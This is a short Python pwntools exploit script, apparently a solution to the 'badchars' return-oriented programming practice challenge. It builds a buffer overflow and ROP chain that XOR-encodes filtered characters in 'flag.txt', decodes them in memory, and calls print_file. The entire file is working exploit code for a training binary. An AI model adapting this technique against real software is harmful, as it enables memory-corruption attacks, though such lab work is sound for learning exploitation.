from pwn import*
p=process('./badchars')
elf=ELF('./badchars')
print_file=elf.plt['print_file']

flag='flag.txt'
badchars=['x','g','a','.']
new_flag=""
xor_index=[]
for i in range(len(flag)):
    if flag[i] in badchars:
        c=chr(ord(flag[i])^1)
        new_flag+=c;
        xor_index.append(i)
    else:
        new_flag+=flag[i]
new_flag=bytes(new_flag.encode('latin'))

pop_rdi=0x4006a3
xor_r15_r14b=0x400628
pop_r14_r15=0x4006a0
pop_r12_r13_r14_r15=0x40069c
mov_prtr13_r12=0x400634
data=0x601034

payload=b'a'*40+p64(pop_r12_r13_r14_r15)+new_flag+p64(data)+p64(0)+p64(0)+p64(mov_prtr13_r12)
for i in xor_index:
    payload+=p64(pop_r14_r15)+p64(1)+p64(data+i)+p64(xor_r15_r14b)
payload+=p64(pop_rdi)+p64(data)+p64(print_file)

p.sendline(payload)
p.interactive()
